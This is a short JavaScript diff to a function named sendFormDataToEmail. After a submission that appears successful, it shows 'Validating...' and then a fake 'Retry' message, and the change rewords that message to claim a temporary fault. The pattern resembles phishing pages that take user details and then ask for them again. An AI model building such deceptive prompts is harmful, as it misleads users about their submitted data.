@@ -96,7 +96,7 @@ function sendFormDataToEmail(formData) {
             swal('Validating...');
             // Delay for 2 seconds and then display "Retry" message
             setTimeout(function() {
-                swal('Retry');
+                swal('Retry. We are working to fix this, give us 24 hrs or contact support');
             }, 2000);
             return response.json(); // Return response data
         } else {
